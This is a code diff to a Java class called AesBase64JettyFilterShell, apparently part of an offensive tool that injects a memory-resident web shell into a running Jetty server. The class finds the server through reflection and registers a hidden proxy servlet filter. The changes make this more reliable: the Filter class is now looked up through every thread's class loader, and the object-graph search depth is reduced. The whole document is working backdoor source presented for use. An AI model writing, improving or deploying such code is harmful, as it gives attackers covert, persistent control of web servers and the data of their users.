@@ -24,12 +24,18 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
             if (!initialized){
                 initialized = true;
                 try {
-                    Class servletRequestFilterClass = loadFilterClass(Thread.currentThread().getContextClassLoader());
-                    if (servletRequestFilterClass == null) {
-                        servletRequestFilterClass = loadFilterClass(AesBase64JettyFilterShell.class.getClassLoader());
+                    Class servletRequestFilterClass = null;
+                    try {
+                        servletRequestFilterClass = loadClasses("jakarta.servlet.Filter");
+                    } catch (Exception e) {
+                        try {
+                            servletRequestFilterClass = loadClasses("javax.servlet.Filter");
+                        } catch (ClassNotFoundException ex) {
+
+                        }
                     }
                     if (servletRequestFilterClass !=null){
-                        addFilter(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass);
+                        addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass);
                     }
                 }catch (Throwable e){
 
@@ -38,18 +44,33 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         }
     }
 
-    public Class loadFilterClass(ClassLoader loader){
-        Class servletRequestFilterClass = null;
+    public Class loadClasses(String className) throws ClassNotFoundException {
+        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
+        classLoaders.add(this.getClass().getClassLoader());
         try {
-            servletRequestFilterClass = Class.forName("jakarta.servlet.Filter",true,loader);
-        } catch (Exception e) {
-            try {
-                servletRequestFilterClass = Class.forName("javax.servlet.Filter",true,loader);
-            } catch (ClassNotFoundException ex) {
+            classLoaders.add(Thread.currentThread().getContextClassLoader());
+            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+            int threadCount = threadGroup.activeCount();
+            Thread[] threads = new Thread[threadCount];
+            threadCount = threadGroup.enumerate(threads);
+            for (int i = 0; i < threadCount; i++) {
+                classLoaders.add(threads[i].getContextClassLoader());
+            }
+        }catch (Exception e){
 
+        }
+        int loaders = classLoaders.size();
+        for (int i = 0; i < loaders; i++) {
+            ClassLoader loader = classLoaders.get(i);
+            if (loader!=null){
+                try {
+                    return Class.forName(className,true,loader);
+                }catch(Throwable e){
+
+                }
             }
         }
-        return servletRequestFilterClass;
+        return Class.forName(className);
     }
 
 
@@ -73,7 +94,7 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         blackType.add(Character.class.getName());
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
-        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,50,0);
+        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,10,0);
         if (jettyServer != null) {
             try {
                 Object serverHandle = getFieldValue(jettyServer,"_handler");
@@ -93,10 +114,10 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDetch,int currentDetch)throws Throwable {
-        currentDetch++;
+    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+        currentDepth++;
 
-        if (currentDetch >= maxDetch){
+        if (currentDepth >= maxDepth){
             return null;
         }
 
@@ -134,14 +155,14 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
                                     if (!blackType.contains(fieldType.getComponentType().getName())){
                                         int arraySize = Array.getLength(fieldValue);
                                         for (int j = 0; j < arraySize; j++) {
-                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDetch,currentDetch);
+                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
                                             if (ret!= null){
                                                 break;
                                             }
                                         }
                                     }
                                 }else{
-                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDetch,currentDetch);
+                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
                                 }
                                 if (ret!= null){
                                     return ret;
